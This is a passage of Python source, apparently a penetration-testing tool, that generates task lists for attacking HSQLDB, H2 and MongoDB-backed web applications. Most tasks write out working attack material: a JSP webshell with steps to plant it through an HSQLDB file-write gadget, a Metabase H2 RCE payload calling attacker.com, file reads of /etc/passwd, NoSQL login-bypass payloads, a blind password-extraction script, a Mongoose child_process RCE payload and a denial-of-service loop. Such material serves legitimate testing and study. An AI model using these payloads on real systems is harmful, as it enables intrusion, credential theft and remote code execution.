                    'grep -rP "jdbc:hsqldb.*password.*" /var/www',
                    'grep -rP "jdbc:hsqldb.*password.*" /opt',
                    'grep -rP "jdbc:hsqldb.*password.*" /home',
                    '',
                    'Look for:',
                    '  - Database name',
                    '  - Username',
                    '  - Password',
                    '  - Port number',
                    '',
                    'Common paths:',
                    '  /var/www/html/config.php',
                    '  /opt/app/application.properties',
                    '  ~/.hsqldb/hsqldb.properties'
                ],
                'success_indicators': [
                    'JDBC connection string found',
                    'Credentials extracted',
                    'Database name identified'
                ],
                'notes': 'Database name required for connection. Search thoroughly in config files'
            }
        })

        # Task 3: Java System Property Reading
        tasks.append({
            'id': f'hsqldb-java-props-{port}',
            'name': 'HSQLDB Java System Properties Enumeration',
            'type': 'manual',
            'metadata': {
                'description': 'Read Java system properties via HSQLDB function',
                'tags': ['OSCP:MEDIUM', 'ENUM'],
                'alternatives': [
                    'Create function in HSQLDB:',
                    'CREATE FUNCTION getsystemproperty(IN key VARCHAR) RETURNS VARCHAR LANGUAGE JAVA',
                    'DETERMINISTIC NO SQL',
                    "EXTERNAL NAME 'CLASSPATH:java.lang.System.getProperty'",
                    '',
                    'Execute function:',
                    "VALUES(getsystemproperty('user.name'))",
                    "VALUES(getsystemproperty('user.home'))",
                    "VALUES(getsystemproperty('java.version'))",
                    "VALUES(getsystemproperty('os.name'))",
                    "VALUES(getsystemproperty('user.dir'))",
                    '',
                    'Full list:',
                    'https://docs.oracle.com/javase/tutorial/essential/environment/sysprop.html'
                ],
                'success_indicators': [
                    'System properties retrieved',
                    'Username discovered',
                    'File paths revealed'
                ],
                'next_steps': [
                    'Use paths for file write operations',
                    'Identify web root for webshell',
                    'Enumerate Java classpath'
                ],
                'notes': 'Java Language Routines (JRT) allow calling static Java methods from SQL'
            }
        })

        # Task 4: File Write Exploitation
        tasks.append({
            'id': f'hsqldb-file-write-{port}',
            'name': 'HSQLDB File Write via Java Gadget',
            'type': 'manual',
            'metadata': {
                'description': 'Write files to disk using Java gadget (webshell, SSH keys)',
                'tags': ['OSCP:HIGH', 'EXPLOIT', 'RCE'],
                'alternatives': [
                    'Create procedure:',
                    'CREATE PROCEDURE writetofile(IN paramString VARCHAR, IN paramArrayOfByte VARBINARY(1024))',
                    'LANGUAGE JAVA DETERMINISTIC NO SQL EXTERNAL NAME',
                    "'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename'",
                    '',
                    'Write webshell (hex-encoded, max 1024 bytes):',
                    'call writetofile(',
                    "  '/var/www/html/shell.jsp',",
                    "  cast ('3c2540207061676520696d706f72743d226a6176612e696f2e2a2220253e...' AS VARBINARY(1024))",
                    ')',
                    '',
                    'Generate hex:',
                    'echo -n \'<?php system($_GET["cmd"]); ?>\' | xxd -p | tr -d "\\n"',
                    '',
                    'Access webshell:',
                    'http://<target>/shell.jsp?cmd=id'
                ],
                'success_indicators': [
                    'File written successfully',
                    'Webshell accessible',
                    'Command execution confirmed'
                ],
                'failure_indicators': [
                    'Permission denied',
                    'Path does not exist',
                    'Max size exceeded (1024 bytes)'
                ],
                'next_steps': [
                    'Upload full reverse shell',
                    'Establish persistent access',
                    'Enumerate system'
                ],
                'notes': 'Limitation: 1024 byte max. Use for small webshells or SSH keys. Gadget auto-loaded in JDK classpath'
            }
        })

        # Task 5: RCE via Webshell
        tasks.append({
            'id': f'hsqldb-rce-{port}',
            'name': 'HSQLDB RCE Workflow',
            'type': 'parent',
            'children': [
                {
                    'id': f'hsqldb-rce-prep-{port}',
                    'name': 'Prepare Webshell Payload',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Create and hex-encode webshell payload',
                        'tags': ['EXPLOIT'],
                        'alternatives': [
                            'JSP webshell:',
                            '<%@ page import="java.io.*" %>',
                            '<%',
                            '  String cmd = request.getParameter("cmd");',
                            '  Process p = Runtime.getRuntime().exec(cmd);',
                            '  BufferedReader br = new BufferedReader(',
                            '    new InputStreamReader(p.getInputStream()));',
                            '  String line;',
                            '  while ((line = br.readLine()) != null) {',
                            '    out.println(line);',
                            '  }',
                            '%>',
                            '',
                            'Convert to hex:',
                            'cat webshell.jsp | xxd -p | tr -d "\\n"'
                        ]
                    }
                },
                {
                    'id': f'hsqldb-rce-write-{port}',
                    'name': 'Write Webshell via HSQLDB',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Execute file write procedure',
                        'alternatives': [
                            'See: HSQLDB File Write task above'
                        ]
                    }
                },
                {
                    'id': f'hsqldb-rce-verify-{port}',
                    'name': 'Verify Webshell Access',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test webshell functionality',
                        'alternatives': [
                            'curl http://<target>/shell.jsp?cmd=id',
                            'curl http://<target>/shell.jsp?cmd=whoami',
                            'curl http://<target>/shell.jsp?cmd=ls+-la'
                        ]
                    }
                }
            ]
        })

        # Exploit research if version detected
        if version:
            tasks.append(self._create_exploit_research('HSQLDB', version, port))

        return tasks

    def _get_h2_tasks(self, target: str, port: int, version: str) -> List[Dict[str, Any]]:
        """Generate H2 Database enumeration tasks"""
        tasks = []

        # Task 1: Unauthenticated Database Creation
        tasks.append({
            'id': f'h2-unauth-{port}',
            'name': 'H2 Unauthenticated Database Creation',
            'type': 'manual',
            'metadata': {
                'description': 'Create new database without credentials (H2 vulnerability)',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'EXPLOIT'],
                'alternatives': [
                    'Access H2 Console:',
                    f'http://{target}:{port}/h2-console',
                    '',
                    'Create database without credentials:',
                    '  1. Enter non-existent database name',
                    '  2. Leave username/password blank',
                    '  3. Click Connect',
                    '  4. New database created automatically',
                    '',
                    'Alternative: Known MySQL database:',
                    '  Driver: MySQL',
                    '  JDBC URL: jdbc:mysql://<target>:3306/<dbname>',
                    '  Username: <known_user>',
                    '  Password: <known_pass>'
                ],
                'success_indicators': [
                    'Database created successfully',
                    'H2 console accessible',
                    'SQL queries executable'
                ],
                'failure_indicators': [
                    'Authentication required',
                    'Console not accessible',
                    'Connection refused'
                ],
                'next_steps': [
                    'Test RCE exploitation',
                    'Enumerate existing databases',
                    'Extract sensitive data'
                ],
                'notes': 'H2 allows creating databases without authentication by default. Major security flaw'
            }
        })

        # Task 2: H2 RCE Exploitation
        tasks.append({
            'id': f'h2-rce-{port}',
            'name': 'H2 Database RCE Exploitation',
            'type': 'manual',
            'metadata': {
                'description': 'Exploit H2 for remote code execution',
                'tags': ['OSCP:HIGH', 'EXPLOIT', 'RCE'],
                'alternatives': [
                    'Exploit script:',
                    'https://gist.github.com/h4ckninja/22b8e2d2f4c29e94121718a43ba97eed',
                    '',
                    'Manual exploitation:',
                    '  1. Access H2 console',
                    '  2. Create/connect to database',
                    '  3. Execute malicious SQL',
                    '  4. Trigger code execution',
                    '',
                    'Common techniques:',
                    '  - ALIAS to Java methods',
                    '  - CREATE TRIGGER with JavaScript',
                    '  - File operations via SQL'
                ],
                'success_indicators': [
                    'Code execution achieved',
                    'System commands executed',
                    'Shell access obtained'
                ],
                'next_steps': [
                    'Establish persistent access',
                    'Enumerate system',
                    'Escalate privileges'
                ],
                'notes': 'Check exploit GitHub for latest techniques. H2 has multiple RCE vectors'
            }
        })

        # Task 3: SQL Injection to RCE
        tasks.append({
            'id': f'h2-sqli-rce-{port}',
            'name': 'H2 SQL Injection to RCE',
            'type': 'manual',
            'metadata': {
                'description': 'Exploit SQL injection in H2 for RCE (Metabase vulnerability)',
                'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'WEB'],
                'alternatives': [
                    'Metabase H2 SQLi to RCE payload:',
                    '{',
                    '  "details": {',
                    '    "db": "zip:/app/metabase.jar!/sample-database.db;',
                    '           MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\\\;',
                    '           CREATE TRIGGER IAMPWNED BEFORE SELECT ON',
                    '           INFORMATION_SCHEMA.TABLES AS $$//javascript',
                    '           new java.net.URL(\'https://attacker.com/pwn\').openConnection().getContentLength()',
                    '           $$--=x\\\\;",',
                    '    "advanced-options": false,',
                    '    "ssl": true',
                    '  }',
                    '}',
                    '',
                    'Explanation:',
                    '  - MODE=MSSQLServer: Enable MS SQL compatibility',
                    '  - CREATE TRIGGER: Execute on query',
                    '  - JavaScript engine: Access Java classes',
                    '  - Execute arbitrary code via Java'
                ],
                'success_indicators': [
                    'Trigger created',
                    'JavaScript executed',
                    'External connection made',
                    'RCE confirmed'
                ],
                'notes': 'Blog: https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/ - Pre-auth RCE in Metabase via H2'
            }
        })

        # Task 4: H2 Console Enumeration
        tasks.append({
            'id': f'h2-enum-{port}',
            'name': 'H2 Console Database Enumeration',
            'type': 'manual',
            'metadata': {
                'description': 'Enumerate databases via H2 console',
                'tags': ['OSCP:MEDIUM', 'ENUM'],
                'alternatives': [
                    'SQL queries:',
                    'SHOW DATABASES;',
                    'SHOW TABLES;',
                    'SELECT * FROM INFORMATION_SCHEMA.TABLES;',
                    'SELECT * FROM INFORMATION_SCHEMA.USERS;',
                    'SELECT * FROM <table_name>;',
                    '',
                    'File operations:',
                    "SELECT * FROM CSVREAD('/etc/passwd');",
                    "CALL FILE_READ('/etc/passwd');"
                ],
                'success_indicators': [
                    'Database structure revealed',
                    'Sensitive data extracted',
                    'File read successful'
                ],
                'notes': 'H2 supports file operations via SQL. Can read system files if permissions allow'
            }
        })

        # Exploit research if version detected
        if version:
            tasks.append(self._create_exploit_research('H2 Database', version, port))

        return tasks

    def _get_generic_nosql_tasks(self, target: str, port: int) -> List[Dict[str, Any]]:
        """Generate generic NoSQL enumeration tasks when database type unknown"""
        tasks = []

        # Task 1: Port Banner Grabbing
        tasks.append({
            'id': f'nosql-banner-{port}',
            'name': 'NoSQL Service Banner Grabbing',
            'type': 'command',
            'metadata': {
                'command': f'nc -vn {target} {port}',
                'description': 'Connect to port and grab service banner',
                'tags': ['QUICK_WIN', 'MANUAL'],
                'flag_explanations': {
                    'nc': 'Netcat network utility',
                    '-v': 'Verbose output',
                    '-n': 'No DNS resolution',
                    f'{target}': 'Target IP',
                    f'{port}': 'Target port'
                },
                'success_indicators': [
                    'Banner displayed',
                    'Service type identified',
                    'Version information revealed'
                ],
                'alternatives': [
                    f'telnet {target} {port}',
                    f'nmap -sV -p {port} {target}'
                ]
            }
        })

        # Task 2: Nmap Service Detection
        tasks.append({
            'id': f'nosql-nmap-{port}',
            'name': 'NoSQL Service Detection',
            'type': 'command',
            'metadata': {
                'command': f'nmap -sV -sC -p {port} {target}',
                'description': 'Identify NoSQL service type',
                'tags': ['AUTOMATED'],
                'flag_explanations': {
                    '-sV': 'Service version detection',
                    '-sC': 'Default NSE scripts',
                    '-p': f'Target port {port}'
                },
                'success_indicators': [
                    'Service type identified',
                    'Version detected',
                    'Scripts provide additional info'
                ],
                'estimated_time': '2-3 minutes'
            }
        })

        return tasks

    def _get_web_nosql_injection_tasks(self, target: str) -> List[Dict[str, Any]]:
        """Generate web application NoSQL injection testing tasks

        These tasks focus on testing web applications that use NoSQL backends
        (different from direct database enumeration)
        """
        tasks = []

        # Task 1: Basic NoSQL Operator Injection Testing
        tasks.append({
            'id': 'web-nosql-operators',
            'name': 'NoSQL Operator Injection Testing',
            'type': 'manual',
            'metadata': {
                'description': 'Test web application for NoSQL operator injection vulnerabilities',
                'tags': ['OSCP:HIGH', 'WEB', 'MANUAL', 'INJECTION'],
                'alternatives': [
                    'Common MongoDB operators to test:',
                    '',
                    'URL-encoded (GET/POST parameters):',
                    '  username[$ne]=admin&password[$ne]=admin  # Not equal bypass',
                    '  username[$regex]=.*&password[$regex]=.*  # Regex wildcard',
                    '  username[$exists]=true&password[$exists]=true  # Existence check',
                    '  username[$gt]=&password[$gt]=  # Greater than (empty = all)',
                    '  username[$nin][]=admin&password[$ne]=x  # Not in array',
                    '',
                    'JSON payload (Content-Type: application/json):',
                    '  {"username": {"$ne": null}, "password": {"$ne": null}}',
                    '  {"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}',
                    '  {"username": {"$gt": undefined}, "password": {"$gt": undefined}}',
                    '  {"username": {"$regex": "^admin"}, "password": {"$ne": ""}}',
                    '',
                    'PHP array syntax (if PHP backend):',
                    '  username[arrName]=value  # PHP converts to array',
                    '  username[$ne]=1&password[$ne]=1',
                    '',
                    'Test in: Login forms, search parameters, filters, API endpoints'
                ],
                'success_indicators': [
                    'Authentication bypass achieved',
                    'Unauthorized access granted',
                    'Different response than normal rejection',
                    'Server returns user data without valid credentials',
                    'Error messages reveal MongoDB/NoSQL usage'
                ],
                'failure_indicators': [
                    'Same error as normal login failure',
                    'WAF blocks request',
                    'Input sanitization removes operators',
                    'Application uses SQL (not NoSQL)'
                ],
                'next_steps': [
                    'If bypass works: Extract data using regex enumeration',
                    'If error messages leak: Use error-based extraction',
                    'If timing differences: Use blind injection',
                    'Test other parameters beyond authentication'
                ],
                'notes': 'Modern frameworks often sanitize operators. Try encoding, nested objects, alternative formats. Check Burp Suite request/response for clues about backend'
            }
        })

        # Task 2: MongoDB $where Clause SQL-like Injection
        tasks.append({
            'id': 'web-nosql-where-injection',
            'name': 'MongoDB $where Clause Injection',
            'type': 'manual',
            'metadata': {
                'description': 'Exploit MongoDB $where clause for JavaScript injection',
                'tags': ['OSCP:MEDIUM', 'WEB', 'INJECTION', 'ADVANCED'],
                'alternatives': [
                    'If application uses $where for queries:',
                    '  query = { $where: `this.username == \'${username}\'` }',
                    '',
                    'Injection payloads (similar to SQL injection):',
                    "  admin' || 'a'=='a  # Tautology bypass",
                    "  ' || 1==1//  # Always true + comment",
                    "  ' || 1==1%00  # Null byte termination",
                    "  admin' || 'a'=='a  # MongoDB equivalent of ' or 1=1--",
                    '',
                    'Field existence check:',
                    "  /?search=admin' && this.password%00",
                    '',
                    'Password extraction via regex:',
                    "  /?search=admin' && this.password.match(/^a.*$/)%00",
                    "  /?search=admin' && this.password.match(/^ab.*$/)%00",
                    "  /?search=admin' && this.password.match(/^abc.*$/)%00",
                    '  ... continue until full password found',
                    '',
                    'Time-based blind (if $where enabled):',
                    "  ' && sleep(5000) && 'a'=='a",
                    "  '; while(true){}; //  # DoS (careful!)"
                ],
                'success_indicators': [
                    'Tautology returns all records',
                    'Field enumeration confirms field names',
                    'Character-by-character extraction works',
                    'Time delays confirm blind injection',
                    'Error messages reveal JavaScript execution'
                ],
                'failure_indicators': [
                    '$where disabled (--noscripting flag)',
                    'Application does not use $where',
                    'Input sanitization blocks quotes/operators',
                    'MongoDB v7.0+ (JavaScript disabled by default)'
                ],
                'notes': 'MongoDB v7.0+ disables server-side JavaScript by default. Check version first. $where is dangerous and many apps avoid it'
            }
        })

        # Task 3: Blind NoSQL Injection - Regex Enumeration
        tasks.append({
            'id': 'web-nosql-blind-regex',
            'name': 'Blind NoSQL Injection via Regex',
            'type': 'parent',
            'children': [
                {
                    'id': 'web-nosql-length-enum',
                    'name': 'Extract Password Length',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Determine password length using regex',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'alternatives': [
                            'Test password length:',
                            '  username[$ne]=admin&password[$regex]=.{1}  # Length 1',
                            '  username[$ne]=admin&password[$regex]=.{2}  # Length 2',
                            '  username[$ne]=admin&password[$regex]=.{3}  # Length 3',
                            '  ... continue until match found',
                            '',
                            'JSON format:',
                            '  {"username": "admin", "password": {"$regex": ".{8}"}}',
                            '',
                            'Observe response differences:',
                            '  - Login success = length correct',
                            '  - Different error = length incorrect',
                            '  - Response time variation'
                        ],
                        'success_indicators': [
                            'Response changes at specific length',
                            'Login behavior differs',
                            'Length identified'
                        ]
                    }
                },
                {
                    'id': 'web-nosql-char-enum',
                    'name': 'Extract Password Characters',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Extract password character-by-character using regex',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'alternatives': [
                            'If length = 8, extract characters:',
                            '',
                            'Character 1:',
                            '  password[$regex]=^a.{7}  # Starts with a?',
                            '  password[$regex]=^b.{7}  # Starts with b?',
                            '  ... continue alphabet until match',
                            '',
                            'Character 2 (if first = m):',
                            '  password[$regex]=^ma.{6}',
                            '  password[$regex]=^mb.{6}',
                            '  ... continue',
                            '',
                            'Optimized with partial wildcards:',
                            '  password[$regex]=^m.*  # Starts with m',
                            '  password[$regex]=^md.*  # Starts with md',
                            '  password[$regex]=^mdp  # Exact match',
                            '',
                            'JSON format:',
                            '  {"username": "admin", "password": {"$regex": "^a"}}',
                            '  {"username": "admin", "password": {"$regex": "^ab"}}'
                        ],
                        'success_indicators': [
                            'Response indicates correct character',
                            'Full password extracted',
                            'Can authenticate with found password'
                        ],
                        'notes': 'Automate with Python script (see Blind NoSQL Script task). Manual testing slow for long passwords'
                    }
                },
                {
                    'id': 'web-nosql-blind-script',
                    'name': 'Automated Blind Extraction Script',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Python script for automated blind NoSQL injection',
                        'tags': ['OSCP:HIGH', 'AUTOMATED'],
                        'alternatives': [
                            'Basic extraction script:',
                            '',
                            'import requests',
                            'import string',
                            '',
                            'url = "http://target/login"',
                            'username = "admin"',
                            'password = ""',
                            'chars = string.ascii_letters + string.digits + string.punctuation',
                            '',
                            'while True:',
                            '    for c in chars:',
                            '        # Test character',
                            '        payload = {',
                            '            "username": username,',
                            '            "password[$regex]": f"^{password + c}.*"',
                            '        }',
                            '        r = requests.post(url, data=payload)',
                            '        ',
                            '        # Check if character correct (customize logic)',
                            '        if "success" in r.text or r.status_code == 302:',
                            '            password += c',
                            '            print(f"[+] Found: {password}")',
                            '            break',
                            '    else:',
                            '        # No more characters found',
                            '        print(f"[+] Final password: {password}")',
                            '        break',
                            '',
                            'Tools:',
                            '  - NoSQLMap: https://github.com/codingo/NoSQLMap',
                            '  - nosqli: https://github.com/Charlie-belmer/nosqli',
                            '  - StealthNoSQL: https://github.com/ImKKingshuk/StealthNoSQL'
                        ],
                        'success_indicators': [
                            'Script extracts password automatically',
                            'Faster than manual testing',
                            'Credentials verified'
                        ],
                        'estimated_time': '5-30 minutes (depending on password length)',
                        'notes': 'Customize success detection logic based on application response. May trigger rate limiting'
                    }
                }
            ]
        })

        # Task 4: Advanced Techniques
        tasks.append({
            'id': 'web-nosql-advanced',
            'name': 'Advanced NoSQL Injection Techniques',
            'type': 'parent',
            'children': [
                {
                    'id': 'web-nosql-php-func',
                    'name': 'PHP $func Operator RCE',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit MongoLite $func operator for arbitrary function execution',
                        'tags': ['OSCP:LOW', 'RCE', 'ADVANCED'],
                        'alternatives': [
                            'MongoLite library (Cockpit CMS) vulnerability:',
                            '',
                            'Inject $func operator:',
                            '  {"user": {"$func": "var_dump"}}',
                            '  {"user": {"$func": "phpinfo"}}',
                            '  {"user": {"$func": "system"}, "arg": "id"}',
                            '',
                            'Reference: CVE-2020-35846',
                            '  - https://swarm.ptsecurity.com/rce-cockpit-cms/',
                            '',
                            'Requirements:',
                            '  - Application uses MongoLite (not MongoDB)',
                            '  - PHP backend',
                            '  - User input reaches MongoLite query'
                        ],
                        'success_indicators': [
                            'PHP function executes',
                            'Output of var_dump/phpinfo visible',
                            'System commands execute (RCE)'
                        ],
                        'notes': 'Very rare. Only works with MongoLite library, not native MongoDB driver'
                    }
                },
                {
                    'id': 'web-nosql-lookup',
                    'name': 'MongoDB $lookup Cross-Collection Queries',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Use $lookup operator to query other collections',
                        'tags': ['OSCP:MEDIUM', 'ENUM', 'ADVANCED'],
                        'alternatives': [
                            'If application uses aggregate() function:',
                            '',
                            'Inject $lookup to read other collections:',
                            '[',
                            '  {',
                            '    "$lookup": {',
                            '      "from": "users",',
                            '      "as": "resultado",',
                            '      "pipeline": [',
                            '        {',
                            '          "$match": {',
                            '            "password": {"$regex": "^.*"}',
                            '          }',
                            '        }',
                            '      ]',
                            '    }',
                            '  }',
                            ']',
                            '',
                            'Target collections:',
                            '  - users (credentials)',
                            '  - admin (administrative data)',
                            '  - config (configuration)',
                            '  - sessions (active sessions)'
                        ],
                        'success_indicators': [
                            'Data from other collections returned',
                            'Unauthorized access to sensitive collections',
                            'Password hashes extracted'
                        ],
                        'failure_indicators': [
                            'Application uses find(), not aggregate()',
                            '$lookup disabled',
                            'Input sanitization blocks aggregation'
                        ],
                        'notes': '$lookup only works with aggregate() function. Most apps use find()/findOne()'
                    }
                },
                {
                    'id': 'web-nosql-error-based',
                    'name': 'Error-Based NoSQL Injection',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Extract data via intentional JavaScript errors in $where',
                        'tags': ['OSCP:MEDIUM', 'INJECTION'],
                        'alternatives': [
                            'If application leaks error messages:',
                            '',
                            'Inject error-generating payload:',
                            '  {"$where": "this.username=\'admin\' && this.password==\'pwd\'; throw new Error(JSON.stringify(this));"}',
                            '',
                            'Error message returns full document:',
                            '  Error: {"username":"admin","password":"secret123","email":"admin@example.com"}',
                            '',
                            'Extract specific fields:',
                            '  throw new Error(this.password)',
                            '  throw new Error(this.apiKey)',
                            '',
                            'Requirement: Application displays MongoDB errors to user'
                        ],
                        'success_indicators': [
                            'Error message contains database record',
                            'Sensitive data leaked in error',
                            'Full document structure revealed'
                        ],
                        'failure_indicators': [
                            'Generic error messages',
                            'Errors suppressed',
                            'JavaScript execution disabled'
                        ],
                        'notes': 'Rare in production. Development/staging environments more likely to leak errors'
                    }
                },
                {
                    'id': 'web-nosql-graphql',
                    'name': 'GraphQL Filter Injection',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit GraphQL resolvers that pass filters to MongoDB',
                        'tags': ['OSCP:MEDIUM', 'WEB', 'GRAPHQL'],
                        'alternatives': [
                            'GraphQL query with filter argument:',
                            '',
                            'query users($filter: UserFilter) {',
                            '  users(filter: $filter) {',
                            '    _id',
                            '    email',
                            '    username',
                            '  }',
                            '}',
                            '',
                            'Inject MongoDB operators in variables:',
                            '{',
                            '  "filter": {"$ne": {}}',
                            '}',
                            '',
                            'Or:',
                            '{',
                            '  "filter": {',
                            '    "username": {"$regex": "^admin"},',
                            '    "password": {"$ne": null}',
                            '  }',
                            '}',
                            '',
                            'Common vulnerable pattern:',
                            '  resolvers pass args.filter directly to collection.find()'
                        ],
                        'success_indicators': [
                            'All users returned instead of filtered subset',
                            'Unauthorized data access',
                            'Operators bypass authorization logic'
                        ],
                        'notes': 'Test GraphQL introspection first to identify filter arguments. Many modern GraphQL implementations sanitize filters'
                    }
                }
            ]
        })

        # Task 5: Recent CVEs and Exploits
        tasks.append({
            'id': 'web-nosql-cves',
            'name': 'Recent NoSQL Injection CVEs (2023-2025)',
            'type': 'manual',
            'metadata': {
                'description': 'Test for recent NoSQL injection vulnerabilities',
                'tags': ['OSCP:MEDIUM', 'RESEARCH', 'CVE'],
                'alternatives': [
                    'CVE-2023-28359: Rocket.Chat Blind NoSQL Injection',
                    '  - Versions: <= 6.0.0',
                    '  - Method: listEmojiCustom Meteor method',
                    '  - Payload: {"$where": "sleep(2000)||true"}',
                    '  - Impact: Unauthenticated timing oracle, data exfiltration',
                    '  - Patched: 6.0.1',
                    '',
                    'CVE-2024-53900 & CVE-2025-23061: Mongoose populate() RCE',
                    '  - Versions: Mongoose <= 8.8.2 (first), <= 8.9.4 (second)',
                    '  - Exploit: $where in populate().match executes in Node.js',
                    '  - Payload: GET /posts?author[$where]=global.process.mainModule.require(\'child_process\').execSync(\'id\')',
                    '  - Bypass: Nest $where under $or to evade first patch',
                    '  - Impact: RCE even if MongoDB JavaScript disabled',
                    '  - Patched: 8.9.5, sanitizeFilter option added',
                    '',
                    'General GraphQL Filter Injection (Ongoing):',
                    '  - Vulnerable pattern: GraphQL resolvers forward args.filter to MongoDB',
                    '  - Mitigation: Strip $ keys, validate schemas (Joi/Zod)',
                    '',
                    'Testing checklist:',
                    '  1. Identify framework/library versions',
                    '  2. Search CVE databases for NoSQL injection',
                    '  3. Test known payloads',
                    '  4. Check exploit-db, GitHub for PoCs'
                ],
                'success_indicators': [
                    'Application version matches vulnerable range',
                    'Exploit PoC works',
                    'Timing differences confirm blind injection',
                    'RCE achieved'
                ],
                'notes': 'Always check library versions. Many NoSQL injections fixed in recent updates. Focus on legacy systems'
            }
        })

        # Task 6: Defense Testing & Mitigation Verification
        tasks.append({
            'id': 'web-nosql-defenses',
            'name': 'NoSQL Injection Defense Testing',
            'type': 'manual',
            'metadata': {
                'description': 'Verify NoSQL injection mitigations are in place',
                'tags': ['OSCP:LOW', 'DEFENSIVE', 'VALIDATION'],
                'alternatives': [
                    'Check for defensive measures:',
                    '',
                    '1. Input sanitization:',
                    '   - Test if $ characters stripped/rejected',
                    '   - Try URL encoding: %24ne instead of $ne',
                    '   - Try Unicode: \\u0024ne',
                    '',
                    '2. Type validation:',
                    '   - Send arrays where strings expected',
                    '   - username[]=admin vs username=admin',
                    '   - Check if types enforced',
                    '',
                    '3. MongoDB configuration:',
                    '   - JavaScript disabled? (--noscripting)',
                    '   - Server version >= 7.0? (JS disabled by default)',
                    '',
                    '4. Framework protections:',
                    '   - Mongoose sanitizeFilter option enabled?',
                    '   - express-mongo-sanitize middleware present?',
                    '   - mongo-sanitize library used?',
                    '',
                    '5. Allow-lists vs block-lists:',
                    '   - Explicit field mapping?',
                    '   - Joi/Zod schema validation?',
                    '   - GraphQL type system enforcement?',
                    '',
                    'Defensive recommendations:',
                    '  - Strip all keys starting with $',
                    '  - Validate data types (reject arrays for string fields)',
                    '  - Disable MongoDB JavaScript (--noscripting)',
                    '  - Use parameterized queries / ORM with type checking',
                    '  - Never spread untrusted objects into queries'
                ],
                'success_indicators': [
                    'Sanitization blocks operator injection',
                    'Type validation rejects malformed input',
                    'JavaScript execution disabled',
                    'Framework protections active'
                ],
                'notes': 'Testing defenses helps understand attack surface. Document bypasses found'
            }
        })

        # Task 7: NoSQL Injection Tools
        tasks.append({
            'id': 'web-nosql-tools',
            'name': 'Automated NoSQL Injection Tools',
            'type': 'manual',
            'metadata': {
                'description': 'Use specialized tools for NoSQL injection testing',
                'tags': ['OSCP:MEDIUM', 'AUTOMATED', 'TOOLS'],
                'alternatives': [
                    'NoSQL Injection Tools:',
                    '',
                    '1. NoSQLMap (Most popular):',
                    '   - https://github.com/codingo/NoSQLMap',
                    '   - Usage: python nosqlmap.py -u http://target/login -p username,password',
                    '   - Supports: MongoDB, CouchDB, Redis, Cassandra',
                    '   - Features: Blind extraction, auth bypass, enumeration',
                    '',
                    '2. nosqli (Modern alternative):',
                    '   - https://github.com/Charlie-belmer/nosqli',
                    '   - Usage: nosqli scan --url http://target/api',
                    '   - JSON support, GraphQL testing',
                    '',
                    '3. StealthNoSQL:',
                    '   - https://github.com/ImKKingshuk/StealthNoSQL',
                    '   - Focuses on stealth, minimal noise',
                    '',
                    '4. NoSQL-Attack-Suite:',
                    '   - https://github.com/C4l1b4n/NoSQL-Attack-Suite',
                    '   - Comprehensive attack vectors',
                    '',
                    '5. MongoDB Username/Password Enum:',
                    '   - https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration',
                    '   - Specialized for credential extraction',
                    '',
                    'Burp Suite Extensions:',
                    '  - NoSQLiScanner',
                    '  - Backslash Powered Scanner (detects injections)',
                    '',
                    'Manual testing still recommended for:',
                    '  - Custom applications',
                    '  - GraphQL endpoints',
                    '  - Non-standard implementations'
                ],
                'success_indicators': [
                    'Tool identifies injection points',
                    'Automated extraction successful',
                    'Credentials obtained',
                    'Vulnerability confirmed'
                ],
                'failure_indicators': [
                    'WAF blocks automated requests',
                    'Rate limiting triggered',
                    'Tool unable to handle custom logic'
                ],
                'estimated_time': '10-30 minutes',
                'notes': 'Tools automate tedious brute force extraction. Combine with manual testing for best results'
            }
        })

        return tasks

    def _create_exploit_research(self, product: str, version: str, port: int) -> Dict[str, Any]:
        """Create exploit research task"""
        search_term = f"{product} {version}"

        return {
            'id': f'nosql-exploit-{port}',
            'name': f'Exploit Research: {search_term}',
            'type': 'parent',
            'children': [
                {
                    'id': f'nosql-searchsploit-{port}',
                    'name': f'SearchSploit: {search_term}',
                    'type': 'command',
                    'metadata': {
                        'command': f'searchsploit "{search_term}"',
                        'description': f'Search exploit-db for {search_term} exploits',
                        'tags': ['OSCP:HIGH', 'RESEARCH'],
                        'flag_explanations': {
                            'searchsploit': 'Search ExploitDB local archive',
                            f'"{search_term}"': 'Search query with quotes for exact match'
                        },
                        'success_indicators': [
                            'Exploits found',
                            'CVE numbers displayed',
                            'Exploit paths shown'
                        ],
                        'alternatives': [
                            'Online: https://www.exploit-db.com',
                            'Google: <product> <version> exploit',
                            'GitHub: <product> <version> exploit'
                        ]
                    }
                },
                {
                    'id': f'nosql-cve-{port}',
                    'name': f'CVE Lookup: {search_term}',
                    'type': 'manual',
                    'metadata': {
                        'description': f'Search CVE databases for {search_term}',
                        'tags': ['RESEARCH'],
                        'alternatives': [
                            'Resources:',
                            '  - https://cve.mitre.org',
                            '  - https://nvd.nist.gov',
                            '  - https://vulners.com',
                            f'  - Google: {search_term} CVE'
                        ]
                    }
                }
            ]
        }
